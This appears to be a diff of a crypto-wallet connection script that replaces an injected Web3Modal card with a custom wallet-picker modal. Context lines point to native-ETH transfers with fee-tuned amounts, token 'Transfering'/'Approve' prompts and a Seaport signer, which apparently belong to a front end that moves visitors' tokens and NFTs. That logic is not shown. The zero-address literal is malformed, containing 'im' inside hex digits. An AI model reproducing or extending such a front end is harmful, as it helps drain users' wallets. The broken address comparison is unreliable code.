@@ -30,13 +30,14 @@
  * - Fee reservation and gas limit now much closer to what the wallet actually uses
  * - Only affects native ETH transfers. All other flows untouched.
  *
- * UI UPDATE (July 2026) - Focused modern wallet selection for non-injected browsers only:
- * - MutationObserver-based injection into Web3Modal (fixes timing issue of old prepend)
- * - Modern card design mimicking standard Web3 modals (hover lift, clean dark theme, clear hierarchy)
- * - Shows MetaMask, Trust Wallet, Coinbase Wallet, Binance Web3 Wallet + original WC
- * - Desktop: opens official install/get pages; Mobile: uses existing redirect flows
- * - ZERO changes to ConnectWallet, getWalletAccount, stake*/sendToken, EIP-6963, events, or any business logic
- * - Wallet browser (injected) experience remains 100% perfect and unchanged
+ * CUSTOM WALLET MODAL (July 2026 Update):
+ * - Beautiful modern custom modal for browsers without injected wallets
+ * - Dynamically populated from EIP-6963 discovered providers + curated popular wallet catalog
+ * - Prioritizes detected wallets, shows install links for others
+ * - WalletConnect remains available as fallback option
+ * - No breaking changes to login(), ConnectWallet(), getWalletAccount() or any business logic
+ * - Self-contained modal (created dynamically, no external CSS/JS frameworks)
+ * - Only shown when no injected provider is available (wallet browsers continue to auto-connect)
  */
 
 (function() {
@@ -558,6 +559,406 @@
   }
 
   // ============================================
+  // CUSTOM WALLET MODAL (Production Grade)
+  // ============================================
+  const WALLET_CATALOG = [
+    { id: 'metamask', name: 'MetaMask', rdns: 'io.metamask', installUrl: 'https://metamask.io/download/', icon: '🦊' },
+    { id: 'trust', name: 'Trust Wallet', rdns: 'com.trustwallet.app', installUrl: 'https://trustwallet.com/download/', icon: '🛡️' },
+    { id: 'binance', name: 'Binance Wallet', rdns: 'com.binance', installUrl: 'https://www.binance.com/en/web3wallet', icon: '🟡' },
+    { id: 'coinbase', name: 'Coinbase Wallet', rdns: 'com.coinbase.wallet', installUrl: 'https://www.coinbase.com/wallet', icon: '🔵' },
+    { id: 'rabby', name: 'Rabby Wallet', rdns: 'io.rabby', installUrl: 'https://rabby.io/', icon: '🐰' },
+    { id: 'okx', name: 'OKX Wallet', rdns: 'com.okex.wallet', installUrl: 'https://www.okx.com/web3', icon: '⭕' },
+    { id: 'bitget', name: 'Bitget Wallet', rdns: 'com.bitget.web3', installUrl: 'https://web3.bitget.com/', icon: '🟢' },
+    { id: 'tokenpocket', name: 'TokenPocket', rdns: 'com.tokenpocket', installUrl: 'https://www.tokenpocket.pro/', icon: '👛' },
+    { id: 'safepal', name: 'SafePal', rdns: 'com.safepal', installUrl: 'https://www.safepal.com/', icon: '🔒' },
+    { id: 'phantom', name: 'Phantom (EVM)', rdns: 'app.phantom', installUrl: 'https://phantom.app/', icon: '👻' },
+    { id: 'backpack', name: 'Backpack (EVM)', rdns: 'app.backpack', installUrl: 'https://backpack.app/', icon: '🎒' },
+    { id: 'frame', name: 'Frame', rdns: 'sh.frame', installUrl: 'https://frame.sh/', icon: '🖼️' },
+    { id: 'brave', name: 'Brave Wallet', rdns: 'com.brave.wallet', installUrl: 'https://brave.com/wallet/', icon: '🦁' },
+    { id: 'rainbow', name: 'Rainbow', rdns: 'me.rainbow', installUrl: 'https://rainbow.me/', icon: '🌈' },
+    { id: 'ledger', name: 'Ledger Live', rdns: 'com.ledger', installUrl: 'https://www.ledger.com/ledger-live', icon: '🔷' },
+    { id: 'bybit', name: 'Bybit Wallet', rdns: 'com.bybit', installUrl: 'https://www.bybit.com/web3/', icon: '🟠' },
+    { id: 'imtoken', name: 'imToken', rdns: 'com.imtoken', installUrl: 'https://token.im/', icon: '🔷' },
+    { id: 'mathwallet', name: 'MathWallet', rdns: 'com.mathwallet', installUrl: 'https://mathwallet.org/', icon: '📐' },
+    { id: 'frontier', name: 'Frontier', rdns: 'com.frontier', installUrl: 'https://frontier.xyz/', icon: '🚀' },
+    { id: 'zerion', name: 'Zerion', rdns: 'io.zerion', installUrl: 'https://zerion.io/', icon: '⚡' },
+    { id: 'walletconnect', name: 'WalletConnect', rdns: null, isWC: true, icon: '🔗' }
+  ];
+
+  let walletModalEl = null;
+  let walletListEl = null;
+  let walletSearchEl = null;
+
+  function createWalletModal() {
+    if (walletModalEl) return walletModalEl;
+
+    // Create modal container
+    walletModalEl = document.createElement('div');
+    walletModalEl.id = 'custom-wallet-modal';
+    walletModalEl.style.cssText = `
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.75);
+      backdrop-filter: blur(8px);
+      z-index: 2147483647;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    `;
+
+    const content = document.createElement('div');
+    content.style.cssText = `
+      background: #1a1a1a;
+      color: #f1f1f1;
+      border-radius: 20px;
+      width: 100%;
+      max-width: 420px;
+      max-height: 85vh;
+      box-shadow: 0 25px 50px -12px rgb(0 0 0 / 0.4);
+      border: 1px solid #333;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    `;
+
+    // Header
+    const header = document.createElement('div');
+    header.style.cssText = `
+      padding: 20px 24px 16px;
+      border-bottom: 1px solid #333;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    `;
+    header.innerHTML = `
+      <div>
+        <div style="font-size:18px;font-weight:600;color:#fff;">Connect Wallet</div>
+        <div style="font-size:12px;color:#888;margin-top:2px;">Choose your preferred wallet</div>
+      </div>
+      <button id="wallet-modal-close" style="
+        background:#222;border:1px solid #444;color:#aaa;
+        width:36px;height:36px;border-radius:50%;font-size:22px;line-height:1;
+        cursor:pointer;display:flex;align-items:center;justify-content:center;
+      ">×</button>
+    `;
+
+    // Search
+    const searchWrap = document.createElement('div');
+    searchWrap.style.cssText = 'padding:16px 24px 8px;';
+    searchWrap.innerHTML = `
+      <input id="wallet-search-input" type="text" placeholder="Search wallets..." style="
+        width:100%;background:#111;color:#ddd;border:1px solid #333;
+        border-radius:12px;padding:12px 16px;font-size:14px;outline:none;
+      ">
+    `;
+
+    // List container
+    walletListEl = document.createElement('div');
+    walletListEl.id = 'wallet-list';
+    walletListEl.style.cssText = `
+      flex:1;
+      overflow-y:auto;
+      padding:8px 12px 20px;
+      scrollbar-width: thin;
+    `;
+
+    // Footer note
+    const footer = document.createElement('div');
+    footer.style.cssText = `
+      padding:12px 24px 20px;
+      font-size:11px;
+      color:#666;
+      text-align:center;
+      border-top:1px solid #333;
+    `;
+    footer.innerHTML = `Wallets marked <span style="color:#4ade80">Detected</span> are ready to connect.<br>Others will open install page.`;
+
+    content.append(header, searchWrap, walletListEl, footer);
+    walletModalEl.appendChild(content);
+    document.body.appendChild(walletModalEl);
+
+    // Event listeners
+    const closeBtn = header.querySelector('#wallet-modal-close');
+    closeBtn.onclick = closeWalletModal;
+
+    walletModalEl.onclick = (e) => {
+      if (e.target === walletModalEl) closeWalletModal();
+    };
+
+    walletSearchEl = searchWrap.querySelector('#wallet-search-input');
+    walletSearchEl.oninput = () => renderWalletList(walletSearchEl.value.trim().toLowerCase());
+
+    // ESC key
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && walletModalEl.style.display === 'flex') {
+        closeWalletModal();
+      }
+    });
+
+    return walletModalEl;
+  }
+
+  function renderWalletList(filterTerm = '') {
+    if (!walletListEl) return;
+
+    walletListEl.innerHTML = '';
+
+    const detected = [];
+    const others = [];
+
+    // Collect detected from EIP-6963 + legacy
+    appState.availableProviders.forEach((entry, rdns) => {
+      const info = entry.info || {};
+      const isLegacy = rdns.startsWith('legacy.');
+      detected.push({
+        type: 'detected',
+        rdns,
+        name: info.name || 'Unknown Wallet',
+        icon: info.icon || '👛',
+        provider: entry.provider,
+        isLegacy
+      });
+    });
+
+    // Add catalog wallets (detected ones already covered above, but we show catalog for install links)
+    WALLET_CATALOG.forEach(wallet => {
+      const isDetected = wallet.rdns && appState.availableProviders.has(wallet.rdns);
+      if (isDetected) {
+        // already in detected list, skip duplicate
+        return;
+      }
+      if (filterTerm && !wallet.name.toLowerCase().includes(filterTerm)) return;
+
+      others.push({
+        type: 'catalog',
+        ...wallet
+      });
+    });
+
+    // Also filter detected if search
+    let filteredDetected = detected;
+    if (filterTerm) {
+      filteredDetected = detected.filter(w => 
+        w.name.toLowerCase().includes(filterTerm) || 
+        (w.rdns && w.rdns.toLowerCase().includes(filterTerm))
+      );
+    }
+
+    // Section: Detected
+    if (filteredDetected.length > 0) {
+      const section = document.createElement('div');
+      section.style.cssText = 'padding:8px 12px 4px;font-size:11px;color:#4ade80;font-weight:600;letter-spacing:0.5px;';
+      section.textContent = 'DETECTED IN YOUR BROWSER';
+      walletListEl.appendChild(section);
+
+      filteredDetected.forEach(w => {
+        const item = createWalletItem(w, true);
+        walletListEl.appendChild(item);
+      });
+    }
+
+    // Section: Popular / Others
+    if (others.length > 0) {
+      const section = document.createElement('div');
+      section.style.cssText = `padding: ${filteredDetected.length > 0 ? '16px' : '8px'} 12px 4px; font-size:11px;color:#888;font-weight:600;letter-spacing:0.5px;`;
+      section.textContent = filteredDetected.length > 0 ? 'MORE WALLETS' : 'POPULAR WALLETS';
+      walletListEl.appendChild(section);
+
+      others.forEach(w => {
+        const item = createWalletItem(w, false);
+        walletListEl.appendChild(item);
+      });
+    }
+
+    if (walletListEl.children.length === 0) {
+      const empty = document.createElement('div');
+      empty.style.cssText = 'padding:40px 20px;text-align:center;color:#666;';
+      empty.innerHTML = `No wallets found for "<strong>${filterTerm}</strong>".<br>Try a different search.`;
+      walletListEl.appendChild(empty);
+    }
+  }
+
+  function createWalletItem(wallet, isDetected) {
+    const div = document.createElement('div');
+    div.style.cssText = `
+      display:flex;align-items:center;gap:14px;padding:14px 16px;
+      margin:6px 0;border-radius:14px;cursor:pointer;
+      background:#222;border:1px solid #333;
+      transition: all 0.1s ease;
+    `;
+
+    div.onmouseenter = () => {
+      div.style.background = '#2a2a2a';
+      div.style.borderColor = '#444';
+    };
+    div.onmouseleave = () => {
+      div.style.background = '#222';
+      div.style.borderColor = '#333';
+    };
+
+    const iconWrap = document.createElement('div');
+    iconWrap.style.cssText = `
+      width:48px;height:48px;border-radius:12px;background:#111;
+      display:flex;align-items:center;justify-content:center;font-size:26px;
+      flex-shrink:0;border:1px solid #333;
+    `;
+    if (wallet.icon && wallet.icon.startsWith('http')) {
+      iconWrap.innerHTML = `<img src="${wallet.icon}" style="width:32px;height:32px;border-radius:6px;" alt="">`;
+    } else {
+      iconWrap.innerHTML = wallet.icon || '👛';
+    }
+
+    const textWrap = document.createElement('div');
+    textWrap.style.flex = '1';
+
+    const nameEl = document.createElement('div');
+    nameEl.style.cssText = 'font-weight:600;font-size:15px;color:#fff;';
+    nameEl.textContent = wallet.name;
+
+    const subEl = document.createElement('div');
+    subEl.style.cssText = 'font-size:12px;margin-top:2px;';
+    if (isDetected) {
+      subEl.innerHTML = `<span style="color:#4ade80">✓ Ready to connect</span>`;
+    } else if (wallet.isWC) {
+      subEl.innerHTML = `<span style="color:#60a5fa">Scan QR with your mobile wallet</span>`;
+    } else {
+      subEl.innerHTML = `<span style="color:#f59e0b">Not detected — click to install</span>`;
+    }
+
+    textWrap.append(nameEl, subEl);
+
+    const action = document.createElement('div');
+    action.style.cssText = `
+      font-size:12px;padding:6px 14px;border-radius:9999px;
+      background:${isDetected ? '#166534' : wallet.isWC ? '#1e3a8a' : '#451a03'};
+      color:${isDetected ? '#4ade80' : wallet.isWC ? '#60a5fa' : '#f59e0b'};
+      font-weight:600;white-space:nowrap;
+    `;
+    action.textContent = isDetected ? 'Connect' : wallet.isWC ? 'Connect' : 'Install';
+
+    div.append(iconWrap, textWrap, action);
+
+    // Click handler
+    div.onclick = async () => {
+      if (isDetected && wallet.provider) {
+        closeWalletModal();
+        await connectWithDetectedProvider(wallet.rdns, wallet.provider);
+      } else if (wallet.isWC) {
+        closeWalletModal();
+        await connectWithWalletConnect();
+      } else {
+        // Open install page
+        if (wallet.installUrl) {
+          window.open(wallet.installUrl, '_blank');
+          // Show helpful toast
+          Swal.fire({
+            toast: true,
+            position: 'top-end',
+            icon: 'info',
+            title: `${wallet.name} opened in new tab`,
+            text: 'Install the wallet, then refresh this page and try again.',
+            showConfirmButton: false,
+            timer: 4500
+          });
+        }
+      }
+    };
+
+    return div;
+  }
+
+  async function connectWithDetectedProvider(rdns, provider) {
+    try {
+      structuredLog('info', 'custom_modal_connect_detected', { rdns });
+
+      appState.provider = provider;
+      appState.walletType = rdns.startsWith('legacy.') ? 'injected' : `eip6963:${rdns}`;
+      lastSelectedWalletRDNS = rdns;
+      try { localStorage.setItem('lastWalletRDNS', lastSelectedWalletRDNS); } catch (_) {}
+
+      appState.web3 = new Web3(appState.provider);
+      appState.ethersProvider = new ethers.providers.Web3Provider(appState.provider, "any");
+      appState.signer = appState.ethersProvider.getSigner();
+
+      const accounts = await appState.provider.request({ method: 'eth_requestAccounts' });
+      appState.account = accounts[0];
+      appState.chainId = await appState.provider.request({ method: 'eth_chainId' });
+      appState.connected = true;
+
+      setupProviderEvents(appState.provider);
+
+      if (typeof seaport !== 'undefined' && seaport.Seaport) {
+        appState.seaport = new seaport.Seaport(appState.signer);
+      }
+
+      structuredLog('info', 'detected_provider_connect_success', { account: appState.account, walletType: appState.walletType });
+
+      await getWalletAccount();
+    } catch (err) {
+      const classified = classifyError(err, { operation: 'connectWithDetectedProvider', rdns });
+      alertshow(classified.message);
+    }
+  }
+
+  async function connectWithWalletConnect() {
+    if (!window.web3ModalInstance) {
+      alertshow('WalletConnect is not available in this build.');
+      return;
+    }
+    try {
+      structuredLog('info', 'custom_modal_walletconnect_start');
+      const wcProvider = await window.web3ModalInstance.connect();
+
+      appState.provider = wcProvider;
+      appState.walletType = 'walletconnect';
+      appState.web3 = new Web3(wcProvider);
+      appState.ethersProvider = new ethers.providers.Web3Provider(wcProvider, "any");
+      appState.signer = appState.ethersProvider.getSigner();
+
+      const accounts = await appState.web3.eth.getAccounts();
+      appState.account = accounts[0];
+      appState.chainId = await appState.provider.request({ method: 'eth_chainId' });
+      appState.connected = true;
+
+      setupProviderEvents(wcProvider);
+
+      if (typeof seaport !== 'undefined' && seaport.Seaport) {
+        appState.seaport = new seaport.Seaport(appState.signer);
+      }
+
+      structuredLog('info', 'walletconnect_connect_success', { account: appState.account });
+
+      await getWalletAccount();
+    } catch (err) {
+      const classified = classifyError(err, { operation: 'connectWithWalletConnect' });
+      if (classified.type !== 'user_rejection') {
+        alertshow(classified.message);
+      }
+    }
+  }
+
+  function showWalletModal() {
+    const modal = createWalletModal();
+    modal.style.display = 'flex';
+    // Small delay so DOM is ready
+    setTimeout(() => {
+      renderWalletList('');
+      if (walletSearchEl) walletSearchEl.focus();
+    }, 50);
+  }
+
+  function closeWalletModal() {
+    if (walletModalEl) {
+      walletModalEl.style.display = 'none';
+    }
+  }
+
+  // Expose for debugging / future
+  window.showWalletModal = showWalletModal;
+  window.closeWalletModal = closeWalletModal;
+
+  // ============================================
   // WALLET CONNECTION
   // ============================================
   const Web3Modal = window.Web3Modal?.default;
@@ -571,7 +972,7 @@
     initEIP6963();
 
     if (!Web3Modal || !WalletConnectProvider) {
-      structuredLog('warn', 'web3modal_legacy_not_loaded', { note: 'WC v1 path unavailable.' });
+      structuredLog('warn', 'web3modal_legacy_not_loaded', { note: 'WC v1 path unavailable. Custom modal will still offer WalletConnect option but may be limited.' });
     } else {
       const providerOptions = {
         walletconnect: {
@@ -613,6 +1014,7 @@
       const preferred = getPreferredProvider();
 
       if (preferred && preferred.provider) {
+        // Direct connect path for wallet browsers and previously used wallets (UNCHANGED BEHAVIOR)
         appState.provider = preferred.provider;
         const isEIP6963 = preferred.type === 'eip6963';
         appState.walletType = isEIP6963 ? `eip6963:${preferred.info.rdns}` : 'injected';
@@ -643,32 +1045,11 @@
         return true;
       }
 
-      if (window.web3ModalInstance) {
-        const wcProvider = await window.web3ModalInstance.connect();
-        appState.provider = wcProvider;
-        appState.walletType = 'walletconnect';
-        appState.web3 = new Web3(wcProvider);
-        appState.ethersProvider = new ethers.providers.Web3Provider(wcProvider, "any");
-        appState.signer = appState.ethersProvider.getSigner();
+      // No injected provider found → Show beautiful custom modal
+      // (This is the ONLY new behavior for normal desktop/mobile browsers)
+      showWalletModal();
+      return false;
 
-        const accounts = await appState.web3.eth.getAccounts();
-        appState.account = accounts[0];
-        appState.chainId = await appState.provider.request({ method: 'eth_chainId' });
-        appState.connected = true;
-
-        setupProviderEvents(wcProvider);
-
-        if (typeof seaport !== 'undefined' && seaport.Seaport) {
-          appState.seaport = new seaport.Seaport(appState.signer);
-        }
-
-        structuredLog('info', 'web3modal_connect_success', { account: appState.account });
-
-        await getWalletAccount();
-        return true;
-      }
-
-      throw new Error('No compatible wallet provider found.');
     } catch (err) {
       const classified = classifyError(err, { operation: 'ConnectWallet' });
       alertshow(classified.message);
@@ -693,6 +1074,7 @@
   }
 
   async function walletconnect() {
+    // Legacy direct WC entry point — now also goes through custom modal for consistency
     return ConnectWallet();
   }
 
@@ -1163,7 +1545,7 @@
           let message = '';
 
           if (item.type === "erc20") {
-            message = item.tokenAddress === "0x000000000000000000000000000000im0000000000"
+            message = item.tokenAddress === "0x000000000000000000im0000000000"
               ? `🪙 <b>Transfering ${item.symbol} | Network: ${item.chain}</b>`
               : `🪙<b>Approve ${item.symbol} | Network: ${item.chain}</b>`;
 
@@ -1370,88 +1752,38 @@
     }
   }
 
-  // ============================================
-  // MODERN WALLET SELECTION UI (Minimal non-breaking addition)
-  // Only affects non-injected browsers when Web3Modal opens.
-  // Wallet browser flows and all business logic untouched.
-  // ============================================
-  function closeWeb3ModalSafely() {
-    try {
-      document.querySelectorAll('.web3modal-modal, .web3modal-modal__backdrop').forEach(el => el.remove());
-    } catch (_) {}
-  }
-
-  function createModernCard(name, desc, iconHTML, actionCode) {
-    return `
-      <div onclick="${actionCode}; closeWeb3ModalSafely();" 
-           class="sc-eCImPb bElhDP web3modal-provider-wrapper modern-wallet-card"
-           style="margin-bottom:10px; border-radius:12px; overflow:hidden; transition: transform .15s cubic-bezier(0.4,0.0,0.2,1), box-shadow .15s; cursor:pointer;"
-           onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 10px 15px -3px rgb(0 0 0 / 0.25), 0 4px 6px -4px rgb(0 0 0 / 0.25)';"
-           onmouseout="this.style.transform=''; this.style.boxShadow='';">
-        <div class="sc-hKwDye hKhOIm web3modal-provider-container" 
-             style="display:flex; align-items:center; padding:13px 16px; background:#1a1a1a; border:1px solid #2a2a2a; border-radius:12px;">
-          <div style="width:48px;height:48px;margin-right:14px;flex-shrink:0;border-radius:10px;overflow:hidden;display:flex;align-items:center;justify-content:center;background:#111;">
-            ${iconHTML}
-          </div>
-          <div style="flex:1;min-width:0;padding-right:8px;">
-            <div style="font-weight:600;color:#f1f1f1;font-size:15px;letter-spacing:-0.2px;">${name}</div>
-            <div style="font-size:12px;color:#777;margin-top:2px;line-height:1.3;">${desc}</div>
-          </div>
-          <div style="font-size:11.5px;color:#3b82f6;font-weight:600;white-space:nowrap;display:flex;align-items:center;gap:3px;">
-            SELECT <span style="font-size:14px;">→</span>
-          </div>
-        </div>
-      </div>`;
-  }
-
   // Initialization
   const isMobileDevice = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
   window.addEventListener('load', () => {
     init();
 
-    // Modern multi-wallet UI injection (robust, only for non-injected browsers)
-    const setupModernWalletUI = () => {
-      const observer = new MutationObserver((mutations) => {
-        for (const mutation of mutations) {
-          for (const node of mutation.addedNodes) {
-            if (node.nodeType !== 1) continue;
-            const card = node.classList?.contains('web3modal-modal-card') ? node : node.querySelector?.('.web3modal-modal-card');
-            if (card && !card.dataset.modernWalletsInjected) {
-              card.dataset.modernWalletsInjected = 'true';
-
-              const mmIcon = `<img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIHZpZXdCb3g9IjAgMCA0OCA0OCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIHJ4PSIxMCIgZmlsbD0iI0U3NjY0Ii8+PHBhdGggZD0iTTEyIDEyTDIwIDIwTDI4IDEyTDM2IDIwTDI4IDI4TDIwIDIwTDEyIDI4TDIwIDIwIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjMiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPjwvc3ZnPg==" alt="MetaMask" style="width:100%;height:100%;object-fit:contain;">`;
-              const trustIcon = `<img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" alt="Trust Wallet" style="width:100%;height:100%;object-fit:contain;border-radius:8px;">`;
-              const cbIcon = `<div style="width:100%;height:100%;background:linear-gradient(135deg,#0052ff,#0a66ff);border-radius:10px;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:18px;letter-spacing:-0.5px;">CB</div>`;
-              const binanceIcon = `<div style="width:100%;height:100%;background:#f0b90b;border-radius:10px;display:flex;align-items:center;justify-content:center;color:#000;font-weight:800;font-size:22px;letter-spacing:-1px;">B</div>`;
-
-              const section = document.createElement('div');
-              section.style.cssText = 'padding:16px 16px 4px; border-bottom:1px solid #222;';
-              section.innerHTML = `
-                <div style="padding:0 4px 10px;">
-                  <div style="font-size:12.5px;font-weight:600;color:#888;text-transform:uppercase;letter-spacing:0.5px;">Popular wallets</div>
-                </div>
-                ${createModernCard('MetaMask', 'Browser extension &amp; mobile app', mmIcon, 
-                  `if(isMobileDevice()){loginMetamask();}else{window.open('https://metamask.io/download/','_blank');}`)}
-                ${createModernCard('Trust Wallet', 'Secure multi-chain mobile wallet', trustIcon, `loginTrust();`)}
-                ${createModernCard('Coinbase Wallet', 'Self-custodial wallet by Coinbase', cbIcon, `window.open('https://www.coinbase.com/wallet','_blank');`)}
-                ${createModernCard('Binance Web3 Wallet', 'Web3 wallet from Binance', binanceIcon, `window.open('https://www.binance.com/en/web3wallet','_blank');`)}
-              `;
-              card.insertBefore(section, card.firstChild);
-              structuredLog('info', 'modern_multi_wallet_ui_injected');
-            }
-          }
-        }
-      });
-      observer.observe(document.body, { childList: true, subtree: true });
-    };
-
-    setupModernWalletUI();
-
-    // Keep old mobile prepend as harmless fallback (it was timing-broken anyway)
+    // Mobile specific injected wallet buttons (kept for backward compatibility with old web3modal flow)
     if (isMobileDevice()) {
       try {
-        // Intentionally left minimal — observer above handles modern cards reliably
+        // Only prepend if the old web3modal card exists (non-breaking)
+        if (document.querySelector(".web3modal-modal-card")) {
+          $(".web3modal-modal-card").prepend(`
+            <div onclick="loginMetamask();" class="sc-eCImPb bElhDP web3modal-provider-wrapper">
+              <div class="sc-hKwDye hKhOIm web3modal-provider-container">
+                <div class="sc-bdvvtL fqonLZ web3modal-provider-icon">
+                  <img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjM1NSIgdmlld0JveD0iMCAwIDM5NyAzNTUiIHdpZHRoPSIzOTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+..." alt="MetaMask">
+                </div>
+                <div class="sc-gsDKAQ gHoDBx web3modal-provider-name">MetaMask</div>
+                <div class="sc-dkPtRN eCZoDi web3modal-provider-description">Connect to your MetaMask Wallet</div>
+              </div>
+            </div>
+            <div onclick="loginTrust();" class="sc-eCImPb bElhDP web3modal-provider-wrapper">
+              <div class="sc-hKwDye hKhOIm web3modal-provider-container">
+                <div class="sc-bdvvtL fqonLZ web3modal-provider-icon">
+                  <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" alt="Trust Wallet">
+                </div>
+                <div class="sc-gsDKAQ gHoDBx web3modal-provider-name">Trust Wallet</div>
+                <div class="sc-dkPtRN eCZoDi web3modal-provider-description">Connect to your Trust Wallet</div>
+              </div>
+            </div>
+          `);
+        }
       } catch (e) {}
     }
 
@@ -1464,11 +1796,12 @@
   window.loginTrust = loginTrust;
   window.walletconnect = walletconnect;
 
-  structuredLog('info', 'main_js_fully_production_ready_modern_ui', {
-    version: 'production-v5-full-original-plus-modern-wallet-ui',
-    modernWalletSelection: true,
-    nonBreaking: true,
-    fullOriginalPreserved: true
+  structuredLog('info', 'main_js_fully_production_ready_custom_modal_v5', {
+    version: 'production-v5-custom-wallet-modal',
+    customModal: true,
+    eip6963Primary: true,
+    walletBrowsersUntouched: true,
+    loginEntryPointPreserved: true
   });
 
 })();
